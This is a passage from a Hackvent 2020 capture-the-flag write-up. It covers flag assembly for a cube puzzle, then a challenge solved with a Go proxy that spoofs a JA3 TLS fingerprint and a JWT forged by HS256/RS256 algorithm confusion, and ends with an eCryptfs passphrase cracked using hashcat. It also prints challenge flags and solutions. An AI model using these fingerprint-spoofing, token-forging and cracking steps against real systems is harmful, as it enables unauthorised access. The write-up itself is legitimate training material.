<span id="cb42-9"><a href="#cb42-9"></a><span class="ex">/////////</span> PROGRESS: 700000 //////////</span>
<span id="cb42-10"><a href="#cb42-10"></a><span class="co">###################</span></span>
<span id="cb42-11"><a href="#cb42-11"></a><span class="co"># Move: Bi Ui R Di F2</span></span>
<span id="cb42-12"><a href="#cb42-12"></a><span class="ex">------------------</span></span>
<span id="cb42-13"><a href="#cb42-13"></a><span class="ex">6ceisrhhoHV25o_</span>}<span class="ex">tsipl0</span>{ndt@al_n_eo_sa__7a_cs34se_klew_</span>
<span id="cb42-14"><a href="#cb42-14"></a>    <span class="ex">6ce</span></span>
<span id="cb42-15"><a href="#cb42-15"></a>    <span class="ex">isr</span></span>
<span id="cb42-16"><a href="#cb42-16"></a>    <span class="ex">hho</span></span>
<span id="cb42-17"><a href="#cb42-17"></a><span class="ex">HV2</span> 5o_ }<span class="ex">ts</span> ipl</span>
<span id="cb42-18"><a href="#cb42-18"></a><span class="ex">0</span>{n dt@ al_ n_e</span>
<span id="cb42-19"><a href="#cb42-19"></a><span class="ex">o_s</span> a__ 7a_ cs3</span>
<span id="cb42-20"><a href="#cb42-20"></a>    <span class="ex">4se</span></span>
<span id="cb42-21"><a href="#cb42-21"></a>    <span class="ex">_kl</span></span>
<span id="cb42-22"><a href="#cb42-22"></a>    <span class="ex">ew_</span></span>
<span id="cb42-23"><a href="#cb42-23"></a>    üëàüëàüëà</span>
<span id="cb42-24"><a href="#cb42-24"></a>    üëàüëàüëà</span>
<span id="cb42-25"><a href="#cb42-25"></a>    üëàüëàüëà</span>
<span id="cb42-26"><a href="#cb42-26"></a>üëÜüëÜüëÜ üëàüëàüëà üëáüëáüëá üëâüëâüëâ</span>
<span id="cb42-27"><a href="#cb42-27"></a>üëÜüëÜüëÜ üëàüëàüëà üëáüëáüëá üëâüëâüëâ</span>
<span id="cb42-28"><a href="#cb42-28"></a>üëÜüëÜüëÜ üëàüëàüëà üëáüëáüëá üëâüëâüëâ</span>
<span id="cb42-29"><a href="#cb42-29"></a>    üëàüëàüëà</span>
<span id="cb42-30"><a href="#cb42-30"></a>    üëàüëàüëà</span>
<span id="cb42-31"><a href="#cb42-31"></a>    üëàüëàüëà</span>
<span id="cb42-32"><a href="#cb42-32"></a><span class="ex">/////////</span> PROGRESS: 800000 //////////</span>
<span id="cb42-33"><a href="#cb42-33"></a><span class="ex">/////////</span> PROGRESS: 900000 //////////</span>
<span id="cb42-34"><a href="#cb42-34"></a><span class="ex">/////////</span> PROGRESS: 1000000 //////////</span>
<span id="cb42-35"><a href="#cb42-35"></a><span class="ex">/////////</span> PROGRESS: 1100000 //////////</span>
<span id="cb42-36"><a href="#cb42-36"></a><span class="ex">/////////</span> PROGRESS: 1200000 //////////</span>
<span id="cb42-37"><a href="#cb42-37"></a><span class="ex">/////////</span> PROGRESS: 1300000 //////////</span>
<span id="cb42-38"><a href="#cb42-38"></a><span class="ex">/////////</span> PROGRESS: 1400000 //////////</span>
<span id="cb42-39"><a href="#cb42-39"></a><span class="ex">/////////</span> PROGRESS: 1500000 //////////</span>
<span id="cb42-40"><a href="#cb42-40"></a><span class="ex">/////////</span> PROGRESS: 1600000 //////////</span>
<span id="cb42-41"><a href="#cb42-41"></a><span class="ex">/////////</span> PROGRESS: 1700000 //////////</span>
<span id="cb42-42"><a href="#cb42-42"></a><span class="ex">/////////</span> PROGRESS: 1800000 //////////</span>
<span id="cb42-43"><a href="#cb42-43"></a></span>
<span id="cb42-44"><a href="#cb42-44"></a><span class="ex">THE</span> END.</span>
<span id="cb42-45"><a href="#cb42-45"></a></span>
<span id="cb42-46"><a href="#cb42-46"></a><span class="ex">real</span>    1m41.343s</span>
<span id="cb42-47"><a href="#cb42-47"></a><span class="ex">user</span>    7m50.505s</span>
<span id="cb42-48"><a href="#cb42-48"></a><span class="ex">sys</span> 0m27.729s</span>
<span id="cb42-49"><a href="#cb42-49"></a></span></code></pre></div>
<p>Finally, read out the cube side by side (aligned and rotated to point upwards) to find the following parts of the final flag:</p>
<ul>
<li>L: <code>HV20{no_s</code></li>
<li>B: <code>le3p_sinc</code></li>
<li>D: <code>e_4wks_le</code></li>
<li>F: <code>ad5_to_@_</code></li>
<li>U: <code>hi6hscore</code></li>
<li>R: <code>_a7_last}</code></li>
</ul>
<p>And assemble these strings to a flag:</p>
<p><code>HV20{no_s</code> + <code>le3p_sinc</code> + <code>e_4wks_le</code> + <code>ad5_to_@_</code> + <code>hi6hscore</code> + <code>_a7_last}</code></p>
<p>Checkout the solver <a href="./dec16.tar.bz2">here</a></p>
<h2 id="flag-15">Flag</h2>
<p><code>HV20{no_sle3p_since_4wks_lead5_to_@_hi6hscore_a7_last}</code></p>
<h2 id="notes-to-self">Notes to self</h2>
<ul>
<li>Don't do bugs.</li>
<li>think first, then implement.</li>
</ul>
<h1 id="hv2017-santas-gift-factory-control">HV20.17 Santa's Gift Factory Control</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>fix86</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>hard</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>web security</code>, <code>crypto</code></td>
</tr>
</tbody>
</table>
<h2 id="description-16">Description</h2>
<p>Santa has a customized remote control panel for his gift factory at the north pole. Only clients with the following fingerprint seem to be able to connect:</p>
<p><code>771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0</code></p>
<h3 id="mission-1">Mission</h3>
<p>Connect to Santa's super-secret control panel and circumvent its access controls.</p>
<p><a href="https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/">Santa's Control Panel</a> (might be taken down after Hackvent 2020)</p>
<h3 id="hints-9">Hints</h3>
<ul>
<li>If you get a <code>403 forbidden</code>: this is part of the challenge</li>
<li>The remote control panel does client fingerprinting</li>
<li>There is an information leak somewhere which you need to solve the challenge</li>
<li>The challenge is not solvable using brute force or injection vulnerabilities</li>
<li>Newlines matter, check your files</li>
</ul>
<h2 id="approach-16">Approach</h2>
<p>After a bit of web crawling, I found out that the given string <code>771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0</code> is a Ja3 TLS fingerprint (see <a href="https://ja3er.com/form">https://ja3er.com/form</a>).</p>
<p>To look for the client matching the fingerprint, I hashed it to an MD5 sum:</p>
<div class="sourceCode" id="cb43"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1"></a>$ <span class="bu">echo</span> -n <span class="st">&quot;771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0&quot;</span> <span class="kw">|</span> <span class="ex">md5sum</span></span>
<span id="cb43-2"><a href="#cb43-2"></a><span class="ex">a319533bd1a703430d9ad0e21c08c62f</span>  -</span></code></pre></div>
<p><code>ja3er.com</code> returned <code>Go-http-client/1.1</code>. That, however, is a Golang version that's not available anymore.</p>
<p>After finding the blogpost at <a href="https://medium.com/cu-cyber/impersonating-ja3-fingerprints-b9f555880e42">https://medium.com/cu-cyber/impersonating-ja3-fingerprints-b9f555880e42</a> it became clear that a Golang solution using <a href="https://github.com/cucyber/JA3Transport">https://github.com/cucyber/JA3Transport</a> was needed to spoof/impersonate the Go 1.1 client.</p>
<p>After fiddling around with Go, implementing every request in Golang directly, compiling and running a Go binary, I decided to make this easier and to write a small proxy in Golang for local use, inspired by <a href="https://medium.com/swlh/proxy-server-in-golang-43e2365d9cbc">https://medium.com/swlh/proxy-server-in-golang-43e2365d9cbc</a>.</p>
<p>The proxy:</p>
<pre class="Golang"><code>package main

import (
    &quot;fmt&quot;
    &quot;github.com/CUCyber/ja3transport&quot;
    &quot;log&quot;
    &quot;net/http&quot;
    &quot;net/http/httputil&quot;
    &quot;net/url&quot;
)

func main() {
    http.HandleFunc(&quot;/&quot;, Proxy)
    fmt.Println(&quot;About to listen on port 8081...&quot;)
    log.Fatal(http.ListenAndServe(&quot;:&quot;+&quot;8081&quot;, nil))
}

func Proxy(res http.ResponseWriter, req *http.Request) {
    uri := &quot;https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land&quot;
    serveReverseProxy(uri, res, req)
}

func serveReverseProxy(target string, res http.ResponseWriter, req *http.Request) {
    uri, _ := url.Parse(target)
    tr, _ := ja3transport.NewTransport(&quot;771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0&quot;)

    proxy := httputil.NewSingleHostReverseProxy(uri)
    proxy.Transport = tr
    proxy.ServeHTTP(res, req)
}

</code></pre>
<p>With that proxy in place I was now able to run regular requests against localhost:8081 from curl or a browser.</p>
<p><img src="./login.png" alt="Login" /></p>
<p>Next on: guess the username/password to be <code>admin</code> and <code>admin</code> (sometimes you've got to be lucky - or, like in my case, be stuck for an hour and try every possible combination including "santa" until <em>mcia</em> arrives and gives you the much needed hint -_-).</p>
<p>The response to this successfully authenticated request includes a cookie and an html comment leaking some important information...</p>
<div class="sourceCode" id="cb45"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1"></a>$ <span class="ex">curl</span> -X POST http://localhost:8081/login -d username=admin -d password=admin -i</span>
<span id="cb45-2"><a href="#cb45-2"></a><span class="ex">HTTP/1.1</span> 200 OK</span>
<span id="cb45-3"><a href="#cb45-3"></a><span class="ex">Content-Length</span>: 1275</span>
<span id="cb45-4"><a href="#cb45-4"></a><span class="ex">Content-Type</span>: text/html<span class="kw">;</span> <span class="va">charset=</span>utf-8</span>
<span id="cb45-5"><a href="#cb45-5"></a><span class="ex">Date</span>: Thu, 17 Dec 2020 21:24:17 GMT</span>
<span id="cb45-6"><a href="#cb45-6"></a><span class="ex">Server</span>: nginx/1.19.6</span>
<span id="cb45-7"><a href="#cb45-7"></a><span class="ex">Set-Cookie</span>: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii9rZXlzLzFkMjFhOWY5NDUifQ.eyJleHAiOjE2MDgyNDM4NTcsImlhdCI6MTYwODI0MDI1Nywic3ViIjoibm9uZSJ9.HGF-i9KGo1vJ8NNuzc8MD34kignUlQSIPwLQDwLNFMk7I56n7Yeze0FcE3ODHjya_40egTCCDkGG1w_GQpv70n_tuGVhOKvzkA75LMCR5lmvCNOhWhPbutdLq3dGLvlWn0xeiW9Hh-is3mhTHL5u-yz2EB4XGXnGLialWYnFpZAA1KUN1iJpZ0w1wQEBQAYIT5a6FS_195zX_XKeKhNV_2l9jcNqwr36nYxJaOlkgnXlI8KvcGQl6MNUFj4lzg9wbfwMqAw_98ZqoItQAIHidtoy7Qpx8Qv3PHM_yjmV4vHa9osiM-ZfnljooBJNl46oXCzLU7NSClfO6FlHoIeZgQ<span class="kw">;</span> <span class="va">Path=</span>/</span>
<span id="cb45-8"><a href="#cb45-8"></a></span>
<span id="cb45-9"><a href="#cb45-9"></a>[<span class="ex">...</span>]</span>
<span id="cb45-10"><a href="#cb45-10"></a></span>
<span id="cb45-11"><a href="#cb45-11"></a>                <span class="op">&lt;</span><span class="ex">input</span> type=<span class="st">&quot;password&quot;</span> name=<span class="st">&quot;password&quot;</span> placeholder=<span class="st">&quot;Password&quot;</span> id=<span class="st">&quot;password&quot;</span><span class="op">&gt;</span></span>
<span id="cb45-12"><a href="#cb45-12"></a>                </span>
<span id="cb45-13"><a href="#cb45-13"></a>                    <span class="op">&lt;</span><span class="ex">div</span> class=<span class="st">&quot;msg&quot;</span><span class="op">&gt;</span>Invalid credentials.<span class="op">&lt;</span>/div<span class="op">&gt;</span></span>
<span id="cb45-14"><a href="#cb45-14"></a>                </span>
<span id="cb45-15"><a href="#cb45-15"></a>                <span class="op">&lt;</span><span class="ex">input</span> type=<span class="st">&quot;submit&quot;</span> value=<span class="st">&quot;Login&quot;</span><span class="op">&gt;</span></span>
<span id="cb45-16"><a href="#cb45-16"></a>            <span class="op">&lt;</span>/<span class="ex">form</span><span class="op">&gt;</span></span>
<span id="cb45-17"><a href="#cb45-17"></a>        <span class="op">&lt;</span>/<span class="ex">div</span><span class="op">&gt;</span></span>
<span id="cb45-18"><a href="#cb45-18"></a>        </span>
<span id="cb45-19"><a href="#cb45-19"></a>            <span class="op">&lt;</span>!<span class="ex">--DevNotice</span>: User santa seems broken. Temporarily use santa1337.--<span class="op">&gt;</span></span>
<span id="cb45-20"><a href="#cb45-20"></a>        </span>
<span id="cb45-21"><a href="#cb45-21"></a>    <span class="op">&lt;</span>/<span class="ex">body</span><span class="op">&gt;</span></span>
<span id="cb45-22"><a href="#cb45-22"></a><span class="op">&lt;</span>/<span class="ex">html</span><span class="op">&gt;</span></span></code></pre></div>
<p>The cookie contains a JWT, which looks like the following in its decoded form:</p>
<div class="sourceCode" id="cb46"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb46-1"><a href="#cb46-1"></a><span class="fu">{</span><span class="dt">&quot;typ&quot;</span><span class="fu">:</span><span class="st">&quot;JWT&quot;</span><span class="fu">,</span><span class="dt">&quot;alg&quot;</span><span class="fu">:</span><span class="st">&quot;RS256&quot;</span><span class="fu">,</span><span class="dt">&quot;kid&quot;</span><span class="fu">:</span><span class="st">&quot;/keys/1d21a9f945&quot;</span><span class="fu">}</span><span class="er">.</span><span class="fu">{</span><span class="dt">&quot;exp&quot;</span><span class="fu">:</span><span class="dv">1608243857</span><span class="fu">,</span><span class="dt">&quot;iat&quot;</span><span class="fu">:</span><span class="dv">1608240257</span><span class="fu">,</span><span class="dt">&quot;sub&quot;</span><span class="fu">:</span><span class="st">&quot;none&quot;</span><span class="fu">}</span><span class="er">.&lt;signature&gt;</span></span></code></pre></div>
<p>Let's go fetch the signing keys:</p>
<div class="sourceCode" id="cb47"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1"></a>$ <span class="ex">curl</span> http://localhost:8081/keys/1d21a9f945 -i</span>
<span id="cb47-2"><a href="#cb47-2"></a><span class="ex">HTTP/1.1</span> 200 OK</span>
<span id="cb47-3"><a href="#cb47-3"></a><span class="ex">Content-Length</span>: 451</span>
<span id="cb47-4"><a href="#cb47-4"></a><span class="ex">Content-Type</span>: text/html<span class="kw">;</span> <span class="va">charset=</span>utf-8</span>
<span id="cb47-5"><a href="#cb47-5"></a><span class="ex">Date</span>: Thu, 17 Dec 2020 20:26:29 GMT</span>
<span id="cb47-6"><a href="#cb47-6"></a><span class="ex">Server</span>: nginx/1.19.6</span>
<span id="cb47-7"><a href="#cb47-7"></a></span>
<span id="cb47-8"><a href="#cb47-8"></a><span class="ex">-----BEGIN</span> PUBLIC KEY-----</span>
<span id="cb47-9"><a href="#cb47-9"></a><span class="ex">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0KDtdDsZ/wpGXWRnP6DY</span></span>
<span id="cb47-10"><a href="#cb47-10"></a><span class="ex">Ri7OxTWiwPVg8eTsVcmbzAkk2r4itb3NqRw9xpJeUHorgfw1f9GkuAFg/squMrXb</span></span>
<span id="cb47-11"><a href="#cb47-11"></a><span class="ex">SYM0Vcxqmtsq379xCw6s0pxIafPR7TEAVRh5Mxrudl2lwiO4vJPs+2tmcgui/bFn</span></span>
<span id="cb47-12"><a href="#cb47-12"></a><span class="ex">wC+qByZtIlsP+rlT/MF2wLaWe/LNAWtOXdFVDOzUy6ylLZeL6fRtt9SiuUOQkkC3</span></span>
<span id="cb47-13"><a href="#cb47-13"></a><span class="ex">US8TmvVQYcCcwvu4GBJeGdlKrbIuXIohl7hP5i9/KZ3kIvzByp/Xk5iq+tH95/9u</span></span>
<span id="cb47-14"><a href="#cb47-14"></a><span class="ex">X/9FHKUSrcRE4NYVRhkqHPpn/EbqXHMX0BM0QoGETORlpZIo/lAOQ7/ezOd9z1fw</span></span>
<span id="cb47-15"><a href="#cb47-15"></a><span class="ex">zwIDAQAB</span></span>
<span id="cb47-16"><a href="#cb47-16"></a><span class="ex">-----END</span> PUBLIC KEY-----</span>
<span id="cb47-17"><a href="#cb47-17"></a></span></code></pre></div>
<p>According to <a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/">https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/</a> there are several known flaws inherent to JWTs.</p>
<p>Therefore, different variants are possible now:</p>
<ol>
<li>Try whether the server accepts <code>"none"</code> algorithm --&gt; <em>failed</em> (with <code>"sub"</code> set to each of the values <code>"none"</code>, <code>"admin"</code> and <code>"santa1337"</code>).</li>
<li>Sign the JWT using the HS256 algorithm and the public key, so that when the server decrypts the signature using the public key, it will get a valid result. --&gt; <em>succeeded</em> (with <code>"sub": "santa1337"</code>)</li>
</ol>
<p>To confirm whether it works, query the website:</p>
<div class="sourceCode" id="cb48"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb48-1"><a href="#cb48-1"></a>$ <span class="ex">curl</span> -X GET http://localhost:8081/ -b <span class="st">&#39;session=&lt;JWT-here&gt;&#39;</span> -i</span></code></pre></div>
<p>The final working request producing a response including the flag was:</p>
<div class="sourceCode" id="cb49"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb49-1"><a href="#cb49-1"></a>$ <span class="ex">curl</span> -X GET http://localhost:8081/ -b <span class="st">&#39;session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDgyNDM4NTcsImlhdCI6MTYwODI0MDI1Nywic3ViIjoic2FudGExMzM3In0._7cCkuK8MnGLM58xdhkkFAKy5UyrJQw7yzxA0brJ1eo&#39;</span> -i</span>
<span id="cb49-2"><a href="#cb49-2"></a><span class="ex">HTTP/1.1</span> 200 OK</span>
<span id="cb49-3"><a href="#cb49-3"></a><span class="ex">Content-Length</span>: 6515</span>
<span id="cb49-4"><a href="#cb49-4"></a><span class="ex">Content-Type</span>: text/html<span class="kw">;</span> <span class="va">charset=</span>utf-8</span>
<span id="cb49-5"><a href="#cb49-5"></a><span class="ex">Date</span>: Thu, 17 Dec 2020 21:40:45 GMT</span>
<span id="cb49-6"><a href="#cb49-6"></a><span class="ex">Server</span>: nginx/1.19.6</span>
<span id="cb49-7"><a href="#cb49-7"></a></span>
<span id="cb49-8"><a href="#cb49-8"></a><span class="op">&lt;</span>!<span class="ex">DOCTYPE</span> html<span class="op">&gt;</span></span>
<span id="cb49-9"><a href="#cb49-9"></a><span class="op">&lt;</span><span class="ex">html</span><span class="op">&gt;</span></span>
<span id="cb49-10"><a href="#cb49-10"></a>    <span class="op">&lt;</span><span class="fu">head</span><span class="op">&gt;</span></span>
<span id="cb49-11"><a href="#cb49-11"></a>        <span class="op">&lt;</span><span class="ex">meta</span> charset=<span class="st">&quot;utf-8&quot;</span><span class="op">&gt;</span></span>
<span id="cb49-12"><a href="#cb49-12"></a>        <span class="op">&lt;</span><span class="ex">title</span><span class="op">&gt;</span>Santa<span class="st">&#39;s Control Panel&lt;/title&gt;</span></span>
<span id="cb49-13"><a href="#cb49-13"></a><span class="st">        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span>
<span id="cb49-14"><a href="#cb49-14"></a><span class="st">        &lt;link href=&quot;static/bootstrap/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; media=&quot;screen&quot;&gt;</span></span>
<span id="cb49-15"><a href="#cb49-15"></a><span class="st">        &lt;link href=&quot;static/fontawesome/css/all.min.css&quot; rel=&quot;stylesheet&quot; media=&quot;screen&quot;&gt;</span></span>
<span id="cb49-16"><a href="#cb49-16"></a><span class="st">        &lt;link href=&quot;static/style.css&quot; rel=&quot;stylesheet&quot; media=&quot;screen&quot;&gt;</span></span>
<span id="cb49-17"><a href="#cb49-17"></a><span class="st">    &lt;/head&gt;</span></span>
<span id="cb49-18"><a href="#cb49-18"></a><span class="st">    &lt;!--Congratulations, here&#39;</span>s your flag: HV20<span class="dt">{ja3_h45h_1mp3r50n4710n_15_fun}</span>--<span class="op">&gt;</span></span>
<span id="cb49-19"><a href="#cb49-19"></a>    <span class="op">&lt;</span><span class="ex">body</span> class=<span class="st">&quot;loggedin&quot;</span><span class="op">&gt;</span></span>
<span id="cb49-20"><a href="#cb49-20"></a>        <span class="op">&lt;</span><span class="ex">nav</span> class=<span class="st">&quot;navtop&quot;</span><span class="op">&gt;</span></span>
<span id="cb49-21"><a href="#cb49-21"></a>            <span class="op">&lt;</span><span class="ex">div</span><span class="op">&gt;</span></span>
<span id="cb49-22"><a href="#cb49-22"></a>                <span class="op">&lt;</span><span class="ex">h1</span><span class="op">&gt;</span>Gift Factory Control<span class="op">&lt;</span>/h1<span class="op">&gt;</span></span>
<span id="cb49-23"><a href="#cb49-23"></a>                <span class="op">&lt;</span><span class="ex">a</span> href=<span class="st">&quot;/&quot;</span><span class="op">&gt;&lt;</span>i class=<span class="st">&quot;fas fa-home&quot;</span><span class="op">&gt;&lt;</span>/i<span class="op">&gt;</span>Home<span class="op">&lt;</span>/a<span class="op">&gt;</span></span>
<span id="cb49-24"><a href="#cb49-24"></a>                <span class="op">&lt;</span><span class="ex">a</span> href=<span class="st">&quot;/logout&quot;</span><span class="op">&gt;&lt;</span>i class=<span class="st">&quot;fas fa-sign-out-alt&quot;</span><span class="op">&gt;&lt;</span>/i<span class="op">&gt;</span>Logout<span class="op">&lt;</span>/a<span class="op">&gt;</span></span>
<span id="cb49-25"><a href="#cb49-25"></a>            <span class="op">&lt;</span>/<span class="ex">div</span><span class="op">&gt;</span></span>
<span id="cb49-26"><a href="#cb49-26"></a>        <span class="op">&lt;</span>/<span class="ex">nav</span><span class="op">&gt;</span></span>
<span id="cb49-27"><a href="#cb49-27"></a></span></code></pre></div>
<p>PS: Signing the JWT was made easy by CyberChef: <a href="https://gchq.github.io/CyberChef/#recipe=JWT_Sign(&#39;-----BEGIN%2520PUBLIC%2520KEY-----%255CnMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0KDtdDsZ/wpGXWRnP6DY%255CnRi7OxTWiwPVg8eTsVcmbzAkk2r4itb3NqRw9xpJeUHorgfw1f9GkuAFg/squMrXb%255CnSYM0Vcxqmtsq379xCw6s0pxIafPR7TEAVRh5Mxrudl2lwiO4vJPs%252B2tmcgui/bFn%255CnwC%252BqByZtIlsP%252BrlT/MF2wLaWe/LNAWtOXdFVDOzUy6ylLZeL6fRtt9SiuUOQkkC3%255CnUS8TmvVQYcCcwvu4GBJeGdlKrbIuXIohl7hP5i9/KZ3kIvzByp/Xk5iq%252BtH95/9u%255CnX/9FHKUSrcRE4NYVRhkqHPpn/EbqXHMX0BM0QoGETORlpZIo/lAOQ7/ezOd9z1fw%255CnzwIDAQAB%255Cn-----END%2520PUBLIC%2520KEY-----%255Cn&#39;,&#39;HS256&#39;)&amp;input=eyJleHAiOjE2MDgyNDM4NTcsImlhdCI6MTYwODI0MDI1Nywic3ViIjoic2FudGExMzM3In0">https://gchq.github.io/CyberChef/#recipe=JWT_Sign('-----BEGIN%2520PUBLIC%2520KEY...</a></p>
<p>However(!!!), you had to keep the trailing newline at the end of the Public Key string. Because if you thought (like me): "Hey, let's be tidy and remove that trailing newline", you would get a different signature that would make an invalid JWT....</p>
<h2 id="flag-16">Flag</h2>
<p><code>HV20{ja3_h45h_1mp3r50n4710n_15_fun}</code></p>
<h1 id="hv2018-santas-lost-home">HV20.18 Santa's lost home</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>darkstar</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>hard</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>linux</code>, <code>forensic</code>, <code>crypto</code></td>
</tr>
</tbody>
</table>
<h2 id="description-17">Description</h2>
<p>Santa has forgotten his password and can no longer access his data. While trying to read the hard disk from another computer he also destroyed an important file. To avoid further damage he made a backup of his home partition. Can you help him recover the data.</p>
<p>When asked he said the only thing he remembers is that he used his name in the password... I thought this was something only a real human would do...</p>
<p><a href="./9154cb91-e72e-498f-95de-ac8335f71584.img.bz2">Backup</a></p>
<h3 id="hints-10">Hints</h3>
<ul>
<li>It's not rock-science, it's station-science!</li>
<li>Use default options</li>
</ul>
<h2 id="approach-17">Approach</h2>
<p>Unwrap the bz2 file:</p>
<div class="sourceCode" id="cb50"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb50-1"><a href="#cb50-1"></a><span class="ex">bzip</span> --decompress --keep 9154cb91-e72e-498f-95de-ac8335f71584.img.bz2</span></code></pre></div>
<p>Mount the filesystem:</p>
<div class="sourceCode" id="cb51"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb51-1"><a href="#cb51-1"></a><span class="fu">mkdir</span> santa</span>
<span id="cb51-2"><a href="#cb51-2"></a><span class="fu">mount</span> 9154cb91-e72e-498f-95de-ac8335f71584.img ./santa</span></code></pre></div>
<p>Explore and discover that the important file that's missing is the <code>wrapped-passphrase</code> (see <a href="https://wiki.archlinux.org/index.php/ECryptfs#Mounting">https://wiki.archlinux.org/index.php/ECryptfs#Mounting</a>)</p>
<div class="sourceCode" id="cb52"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb52-1"><a href="#cb52-1"></a><span class="fu">ls</span> -al ./santa/.ecryptfs/santa/.ecryptfs/</span></code></pre></div>
<p>The wrapped passphrase can be unwrapped using a user defined password and then used to decrypt the ecryptfs data.</p>
<p>With the passphrase missing, we were also blocked at the following stage:</p>
<div class="sourceCode" id="cb53"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb53-1"><a href="#cb53-1"></a><span class="ex">root@hlkali</span>:/home/hacker/Documents/hackvent20/dec18/santa# ecryptfs-recover-private </span>
<span id="cb53-2"><a href="#cb53-2"></a><span class="ex">INFO</span>: Searching for encrypted private directories (this might take a while)<span class="ex">...</span></span>
<span id="cb53-3"><a href="#cb53-3"></a><span class="ex">INFO</span>: Found [/home/hacker/Documents/hackvent20/dec18/santa/.ecryptfs/santa/.Private].</span>
<span id="cb53-4"><a href="#cb53-4"></a><span class="ex">Try</span> to recover this directory? [Y/n]: Y</span>
<span id="cb53-5"><a href="#cb53-5"></a><span class="ex">INFO</span>: Could not find your wrapped passphrase file.</span>
<span id="cb53-6"><a href="#cb53-6"></a><span class="ex">INFO</span>: To recover this directory, you MUST have your original MOUNT passphrase.</span>
<span id="cb53-7"><a href="#cb53-7"></a><span class="ex">INFO</span>: When you first setup your encrypted private directory, you were told to record</span>
<span id="cb53-8"><a href="#cb53-8"></a><span class="ex">INFO</span>: your MOUNT passphrase.</span>
<span id="cb53-9"><a href="#cb53-9"></a><span class="ex">INFO</span>: It should be 32 characters long, consisting of [0-9] and [a-f].</span>
<span id="cb53-10"><a href="#cb53-10"></a></span>
<span id="cb53-11"><a href="#cb53-11"></a><span class="ex">Enter</span> your MOUNT passphrase: </span></code></pre></div>
<p>The high-level flow for generating the wrapped passphrase, as explained in the following nice article: <a href="https://research.kudelskisecurity.com/2015/08/25/how-to-crack-ubuntu-disk-encryption-and-passwords/">https://research.kudelskisecurity.com/2015/08/25/how-to-crack-ubuntu-disk-encryption-and-passwords/</a> looks as follows:</p>
<ul>
<li>Wrapping key = first16bytes(hash(salt + password))</li>
<li>Wrapping key signature = hash(Wrapping Key)</li>
<li>Wrapped passphrase = AES-128(wrapping key, passphrase)</li>
</ul>
<p>From the wrapped passphrase, one can derive a hash with the following format, which can then be used to brute-force the wrapping password using something like JohnTheRipper or HashCat: <code>$ecryptfs$0$1$0011223344556677$21ff10301b5457e1</code></p>
<p>I was lucky and, by accident, found the following at the very end of the <code>.img</code> file something that looked as if it was a <code>wrapped-passphrase</code>:</p>
<pre class="hexdump"><code>05c00000  3a 02 a7 23 b1 2f 66 bc  fe aa 30 35 31 31 31 39  |:..#./f...051119|
05c00010  62 30 62 61 63 65 30 61  62 36 db b8 dd 00 47 8f  |b0bace0ab6....G.|
05c00020  a1 89 ae c3 cb e5 22 94  f4 ca d1 57 fe 2d 78 65  |......&quot;....W.-xe|
05c00030  67 74 61 1f 32 1b 99 30  6f c7 
</code></pre>
<p><img src="https://cybermashup.files.wordpress.com/2015/08/wrappedpassphrasev2.png" alt="wrapped-passphrase file format" /></p>
<p>Gives the hash: <code>$ecryptfs$0$1$a723b12f66bcfeaa$051119b0bace0ab6</code></p>
<p>From the challenge description it became obvious, that the password was <strong>not</strong> in the famous rockyou wordlist, but in a different one. Searching for <code>hashcat wordlist station</code> brought me to the right page. Now, download the wordlist from CrackStation (human passwords only, as indicated in the challenge description): <a href="https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm">https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm</a> Filter the wordlist accoring to the hint given in the challenge description to consider only passwords with some derivation of <code>santa</code> in it: <code>grep -i -e '[s5][a4@]n[t7][4a@]' crackstation-human-only.txt &gt; crackstation-human-santa-only.txt</code></p>
<p>Confirm the hash format with: <a href="https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#how_can_i_identify_the_hash_type">https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#how_can_i_identify_the_hash_type</a></p>
<p>Run hashcat: <code>hashcat --hash-type 12200 ./ecryptfs_hash.txt ./crackstation-human-santa-only.txt</code></p>
<p>Get the password üéâ:</p>
<pre><code>$ecryptfs$0$1$a723b12f66bcfeaa$051119b0bace0ab6:think-santa-lives-at-north-pole
</code></pre>
<p>Re-create the <code>wrapped-passphrase</code> file:</p>
